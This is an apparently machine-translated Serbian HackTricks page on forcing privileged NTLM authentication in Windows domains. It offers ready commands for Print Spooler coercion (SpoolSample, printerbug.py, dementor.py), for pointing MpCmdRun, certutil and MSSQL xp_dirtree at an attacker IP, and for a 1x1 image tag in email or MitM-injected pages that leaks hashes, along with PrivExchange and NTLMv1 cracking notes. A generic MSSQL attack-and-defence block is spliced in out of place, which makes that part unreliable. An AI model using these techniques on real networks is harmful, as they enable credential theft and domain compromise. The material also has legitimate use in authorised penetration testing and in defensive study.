# Force NTLM Privileged Authentication

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** udaljenih autentifikacionih okidača kodiranih u C# koristeći MIDL kompajler kako bi se izbegle zavisnosti od trećih strana.

## Zloupotreba Spooler servisa

Ako je servis _**Print Spooler**_ **omogućen**, možete koristiti već poznate AD akreditive da **zahtevate** od print servera na kontroleru domena **ažuriranje** novih print poslova i samo mu reći da **pošalje obaveštenje na neki sistem**.\
Napomena: kada printer šalje obaveštenje na proizvoljni sistem, potrebno je da se **autentifikuje na** tom **sistemu**. Stoga, napadač može naterati servis _**Print Spooler**_ da se autentifikuje na proizvoljni sistem, a servis će **koristiti nalog računara** za ovu autentifikaciju.

### Pronalaženje Windows servera u domenu

Koristeći PowerShell, dobijte listu Windows mašina. Serveri obično imaju prioritet, pa se fokusirajmo na njih:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```

### Pronalaženje slušajućih Spooler servisa

Koristeći malo izmenjenu verziju @mysmartlogin-ovog (Vincent Le Toux-ovog) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) alata, proverite da li Spooler servis sluša:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Možete koristiti rpcdump.py na Linuxu i potražiti protokol MS-RPRN.

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

### Zatražite od servisa da se autentifikuje na proizvoljnom hostu

Možete kompajlirati [**SpoolSample odavde**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

ili koristite [**3xocyte-ov dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako koristite Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

### Kombinovanje sa neograničenim delegiranjem

Ako napadač već ima pristup kompjuteru sa [neograničenim delegiranjem](unconstrained-delegation.md), napadač može **naterati štampač da se autentifikuje na tom računaru**. Zbog neograničenog delegiranja, **TGT** računa **računara štampača** će biti **sačuvan u memoriji** računara sa neograničenim delegiranjem. Pošto je napadač već kompromitovao ovaj host, on će biti u mogućnosti da **preuzme ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).

## RCP prinudna autentifikacija

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Napad `PrivExchange` je rezultat greške koja je pronađena u funkcionalnosti **Exchange Server `PushSubscription`**. Ova funkcionalnost omogućava Exchange serveru da bude prisiljen od strane bilo kog korisnika domena sa poštanskim sandučetom da se autentifikuje na bilo kojem klijentu obezbeđenom hostu preko HTTP-a.

Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (konkretno, ima **WriteDacl privilegije na domenu pre 2019 Cumulative Update**). Ova greška može biti iskorišćena da omogući **preusmeravanje informacija na LDAP i naknadno izvlačenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na drugim hostovima unutar domena. Uspesno iskorišćavanje ovog napada odmah daje pristup Administratoru domena sa bilo kojim autentifikovanim korisničkim nalogom domena.

## Unutar Windows-a

Ako već imate pristup Windows mašini, možete naterati Windows da se poveže sa serverom koristeći privilegovane naloge sa:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

MSSQL (Microsoft SQL Server) je relaciona baza podataka koju razvija Microsoft. Koristi se za skladištenje i upravljanje podacima u organizacijama. MSSQL je popularan izbor za mnoge aplikacije i sistemski administratori često moraju da se bave ovom bazom podataka.

#### Napadi na MSSQL

Napadi na MSSQL mogu biti veoma opasni i mogu dovesti do kompromitovanja sistema ili krađe podataka. Evo nekoliko uobičajenih napada na MSSQL:

1. **Brute force napad**: Napadač pokušava da pogodi lozinku za pristup MSSQL serveru. Ovo se može postići korišćenjem različitih kombinacija lozinki sve dok se ne pronađe ispravna.
2. **SQL Injection**: Napadač ubacuje zlonamerni SQL kod u unos koji se prosleđuje MSSQL serveru. Ovo može dovesti do izvršavanja neovlašćenih SQL upita i kompromitovanja podataka.
3. **Denial of Service (DoS)**: Napadač preplavljuje MSSQL server sa velikim brojem zahteva kako bi ga onesposobio i sprečio pristup legitimnim korisnicima.
4. **Privilege Escalation**: Napadač pokušava da dobije više privilegija na MSSQL serveru kako bi imao veći pristup podacima i funkcionalnostima.

#### Zaštita od napada na MSSQL

Da biste zaštitili MSSQL server od napada, preporučuje se preduzimanje sledećih mera:

1. **Koristite jake lozinke**: Postavite složene lozinke koje kombinuju velika i mala slova, brojeve i posebne znakove. Takođe, redovno menjajte lozinke.
2. **Ažurirajte MSSQL server**: Redovno ažurirajte MSSQL server kako biste ispravili poznate sigurnosne propuste.
3. **Koristite firewall**: Konfigurišite firewall kako biste ograničili pristup MSSQL serveru samo sa određenih IP adresa.
4. **Koristite enkripciju**: Omogućite enkripciju komunikacije između klijenta i MSSQL servera kako biste zaštitili podatke od neovlašćenog pristupa.
5. **Ograničite privilegije**: Dodelite samo neophodne privilegije korisnicima na MSSQL serveru kako biste smanjili rizik od zloupotrebe.
6. **Pratite logove**: Redovno pratite logove MSSQL servera kako biste otkrili sumnjive aktivnosti i odmah reagovali.

Implementiranjem ovih mera zaštite, možete smanjiti rizik od napada na MSSQL server i zaštititi vaše podatke.

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

Ili koristite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (Microsoft-potpisan binarni fajl) za prisiljavanje NTLM autentifikacije:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML ubacivanje

### Putem emaila

Ako znate **email adresu** korisnika koji se prijavljuje na mašinu koju želite kompromitovati, jednostavno mu možete poslati **email sa slikom veličine 1x1** kao što je:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

i kada je otvori, pokušaće da se autentifikuje.

### MitM

Ako možete izvesti MitM napad na računar i ubaciti HTML kod na stranicu koju će korisnik videti, možete pokušati da ubacite sliku kao što je sledeća na stranici:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Pucanje NTLMv1

Ako možete uhvatiti izazove NTLMv1, pročitajte ovde kako da ih puknete.\
_Zapamtite da biste pukli NTLMv1, morate postaviti Responder izazov na "1122334455667788"_

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
